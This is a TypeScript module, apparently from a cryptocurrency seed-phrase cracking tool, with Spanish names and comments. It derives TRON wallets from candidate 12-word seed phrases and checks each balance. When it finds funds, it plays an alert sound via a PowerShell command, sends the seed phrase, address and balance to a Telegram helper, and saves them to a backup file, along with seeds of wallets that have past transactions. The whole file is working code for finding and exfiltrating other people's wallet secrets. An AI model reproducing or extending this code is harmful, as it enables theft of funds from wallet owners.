
import { rutaSonido } from "../combinar12Palabras";
import { exec } from "child_process";
import { enviarMensajeTelegram } from "../telegram/telegram";
import { agregarWalletConCash } from "../guardar/escribirWalletConCash";
import { generarWallets_TRON } from "../generarWalletsTRON/generarWallet_TRON";
import { consultarSaldoWallet_TRON } from "../../consultas/consultarSaldoWallet_TRON";


//funcion para procesar todo de TRON
export const procesar_TRON = async (semillas: string): Promise<void> => {
    const wallets_TRON = generarWallets_TRON(semillas);
    let contadorWallets = 0;
  
    //iterar sobre todas las wallets que creo
    for (const wallet_TRON of wallets_TRON) {
      
      try {
        const saldoWallets_TRON = await consultarSaldoWallet_TRON(wallet_TRON.Direccion);

        let saldoWallet_TRON = saldoWallets_TRON.data;
        contadorWallets += 1;

        //iterar sobre todas las respuestas de saldo
        for (const saldoWallet of saldoWallet_TRON) {

            const datos_TRON = {
                frase: semillas,
                wallet_de: `TRON = ${saldoWallet.tokenAbbr}`,
                direccion: wallet_TRON.Direccion,
                saldo: String(saldoWallet.balance),
                fecha: new Date().toISOString(),
            };
        
              if (Number(saldoWallet.balance) > 0 || saldoWallets_TRON.transactions_in > 0 ) {
               
                  //solo si hay balance positivo
                  if(Number(saldoWallet.balance) > 0){

                    exec(`powershell -c (New-Object Media.SoundPlayer '${rutaSonido}').PlaySync();`);
      
                    //enviar por telegram
                    await enviarMensajeTelegram(datos_TRON);
        
                    //aregar wallet al json de respaldo
                    await agregarWalletConCash(datos_TRON);
                  };

                  //guardar la wallet sin saldo pero con transacciones pasadas
                  await agregarWalletConCash(datos_TRON);
              };
        
              // console.log(`Wallet_TRON: ${wallet_TRON.Direccion} > balance: ${saldoWallet.balance} > ${contadorWallets}`);

        }
          
        
      } catch (err) {
        console.error("Error procesando wallet:", err);
      }
    }
  };
  